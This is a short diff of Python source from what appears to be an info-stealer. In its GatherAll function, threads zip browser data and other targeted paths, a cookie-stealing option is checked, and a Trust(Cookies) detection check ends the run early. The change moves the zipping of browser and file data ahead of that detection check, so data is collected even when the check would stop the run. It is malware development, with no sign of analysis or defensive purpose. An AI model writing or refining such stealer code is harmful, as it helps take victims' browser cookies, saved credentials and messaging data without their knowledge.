@@ -653,6 +653,12 @@ def GatherAll():
             a.start()
             Threadlist.append(a)
 
+        for patt in browserPaths:
+            threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
+
+        for patt in PathsToZip:
+            threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
+
     
     if cc.get_cookie_stealing() is True:
         for patt in browserPaths:
@@ -666,12 +672,6 @@ def GatherAll():
     DETECTED = Trust(Cookies)
     if DETECTED is True:
         return
-
-    for patt in browserPaths:
-        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
-
-    for patt in PathsToZip:
-        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
     
     # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
 
